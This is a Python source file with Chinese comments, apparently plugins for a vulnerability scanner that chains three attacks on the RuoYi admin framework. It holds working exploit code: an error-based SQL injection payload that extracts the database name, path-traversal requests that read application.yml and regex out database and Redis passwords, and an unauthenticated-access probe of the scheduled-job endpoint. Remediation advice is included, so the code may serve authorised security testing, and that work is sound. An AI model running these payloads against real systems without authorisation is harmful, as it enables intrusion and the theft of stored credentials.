# 链 1 专用插件：SQL 注入 → 文件读取配置 → 定时任务 RCE
#
# 三个原子步骤：
#   1. SQLInjectExtractPlugin: SQL 注入提取数据库名（extra: db_name）
#   2. ConfigReadPlugin: 任意文件读取获取配置凭证（extra: db_password, redis_password）
#   3. JobRCEVerifyPlugin: 定时任务 RCE 接口验证（extra: job_id）
#
# 注意：这些插件是链专用的，不注册到主扫描引擎路由表。
#       链引擎通过 ctx.facts 共享上游数据（如 db_name）。
import re

from core.models import STATUS_CONFIRMED, STATUS_SAFE, STATUS_UNKNOWN, ScanResult
from lib.http import join_url
from plugins.base import PluginBase


class SQLInjectExtractPlugin(PluginBase):
    """SQL 注入提取数据库名（链 1 步骤 1）

    通过 /system/role/list 的 dataScope 参数报错注入，提取当前数据库名。
    成功时 extra.db_name 存储数据库名，供下游节点使用。
    """

    name = "SQL注入提取数据库名"
    severity = "high"
    category = "vuln"
    description = "通过 SQL 报错注入提取当前数据库名"
    fix = "对 dataScope 参数做白名单校验，使用参数化查询"

    def verify(self, target, session):
        url = join_url(target, "/system/role/list")
        # 报错注入 payload：extractvalue 提取 database()
        params = {
            "dataScope": "1 AND extractvalue(1, concat(0x7e, (SELECT database())))",
            "pageNum": "1",
            "pageSize": "10",
        }
        try:
            resp = session.get(url, params=params)
            text = resp.text
        except Exception as e:
            return ScanResult(kind="chain", name=self.name, status=STATUS_UNKNOWN, url=url, evidence=f"网络异常: {e}")

        # 报错特征：XPATH syntax error: '~ry' 或类似
        match = re.search(r"XPATH syntax error: '~([^']+)'", text)
        if match:
            db_name = match.group(1)
            return ScanResult(
                kind="chain",
                name=self.name,
                severity=self.severity,
                status=STATUS_CONFIRMED,
                url=url,
                evidence=f"SQL注入成功，数据库名: {db_name}",
                fix=self.fix,
                extra={"db_name": db_name, "vuln_type": "sql_inject_extract"},
            )
        # 备用特征：直接包含 database() 报错
        if "database()" in text and "error" in text.lower():
            return ScanResult(
                kind="chain",
                name=self.name,
                severity=self.severity,
                status=STATUS_CONFIRMED,
                url=url,
                evidence="响应含 database() 报错特征",
                fix=self.fix,
                extra={"db_name": "unknown", "vuln_type": "sql_inject_extract"},
            )
        return ScanResult(kind="chain", name=self.name, status=STATUS_SAFE, url=url, evidence="未检测到 SQL 注入")


class ConfigReadPlugin(PluginBase):
    """配置文件读取（链 1 步骤 2）

    通过任意文件读取接口读取 application.yml 配置文件，
    正则提取数据库密码和 Redis 密码。
    成功时 extra.db_password / extra.redis_password 存储凭证。
    """

    name = "配置文件读取"
    severity = "high"
    category = "vuln"
    description = "通过任意文件读取获取 application.yml 配置凭证"
    fix = "限制文件读取接口路径，禁止目录穿越，配置文件敏感信息加密存储"

    def verify(self, target, session):
        # 读取 Ruoyi 配置文件（常见路径）
        config_paths = [
            "/profile/../../../../../../../ruoyi-admin/src/main/resources/application.yml",
            "/profile/../../../../../../../config/application.yml",
            "/profile/../../../../../../../application.yml",
        ]
        for path in config_paths:
            url = join_url(target, f"/common/download/resource?resource={path}")
            try:
                resp = session.get(url)
                text = resp.text
            except Exception:
                continue

            # 配置文件特征：包含 password 或 spring 关键字
            if "password" not in text.lower() and "spring" not in text.lower():
                continue

            # 正则提取数据库密码
            db_password = ""
            db_match = re.search(r"password:\s*(\S+)", text)
            if db_match:
                db_password = db_match.group(1)

            # 正则提取 Redis 密码
            redis_password = ""
            redis_match = re.search(r"redis:.*?password:\s*(\S+)", text, re.DOTALL)
            if redis_match:
                redis_password = redis_match.group(1)

            if db_password or redis_password:
                evidence_parts = []
                if db_password:
                    evidence_parts.append(f"数据库密码: {db_password}")
                if redis_password:
                    evidence_parts.append(f"Redis密码: {redis_password}")
                return ScanResult(
                    kind="chain",
                    name=self.name,
                    severity=self.severity,
                    status=STATUS_CONFIRMED,
                    url=url,
                    evidence="; ".join(evidence_parts),
                    fix=self.fix,
                    extra={"db_password": db_password, "redis_password": redis_password, "vuln_type": "config_read"},
                )
            # 配置文件读取成功但未提取到密码
            return ScanResult(
                kind="chain",
                name=self.name,
                status=STATUS_CONFIRMED,
                severity=self.severity,
                url=url,
                evidence="读取到配置文件但未提取到密码",
                fix=self.fix,
                extra={"db_password": "", "redis_password": "", "vuln_type": "config_read"},
            )

        return ScanResult(kind="chain", name=self.name, status=STATUS_SAFE, url=target, evidence="未读取到配置文件")


class JobRCEVerifyPlugin(PluginBase):
    """定时任务 RCE 验证（链 1 步骤 3）

    验证 /monitor/job 接口是否存在未授权访问或可被利用的定时任务 RCE。
    本插件仅验证接口可达性和基本特征，不实际执行命令。
    """

    name = "定时任务RCE验证"
    severity = "high"
    category = "vuln"
    description = "验证定时任务接口未授权访问和 RCE 可能性"
    fix = "定时任务接口强制鉴权，禁止调用任意类方法，白名单限制可执行类"

    def verify(self, target, session):
        # 检查 /monitor/job 接口是否可访问（未授权）
        url = join_url(target, "/monitor/job/list")
        try:
            resp = session.get(url, params={"pageNum": "1", "pageSize": "10"})
            text = resp.text
        except Exception as e:
            return ScanResult(kind="chain", name=self.name, status=STATUS_UNKNOWN, url=url, evidence=f"网络异常: {e}")

        # 特征 1：返回 JSON 含 jobs 列表（未授权访问）
        if '"rows"' in text and ('"jobId"' in text or '"invokeTarget"' in text):
            # 特征 2：存在 invokeTarget 字段（可被利用为 RCE）
            if "invokeTarget" in text:
                return ScanResult(
                    kind="chain",
                    name=self.name,
                    severity=self.severity,
                    status=STATUS_CONFIRMED,
                    url=url,
                    evidence="定时任务接口未授权访问，含 invokeTarget 字段（RCE 风险）",
                    fix=self.fix,
                    extra={"job_endpoint": "/monitor/job", "vuln_type": "job_rce"},
                )
            # 仅未授权访问，无 RCE 特征
            return ScanResult(
                kind="chain",
                name=self.name,
                severity="medium",
                status=STATUS_CONFIRMED,
                url=url,
                evidence="定时任务接口未授权访问（无 invokeTarget）",
                fix=self.fix,
                extra={"job_endpoint": "/monitor/job", "vuln_type": "job_unauth"},
            )

        # 检查是否重定向到登录页（已鉴权）
        if "login" in text.lower() or resp.status_code in (302, 401, 403):
            return ScanResult(kind="chain", name=self.name, status=STATUS_SAFE, url=url, evidence="定时任务接口需鉴权")

        return ScanResult(
            kind="chain", name=self.name, status=STATUS_SAFE, url=url, evidence="定时任务接口不可达或无特征"
        )
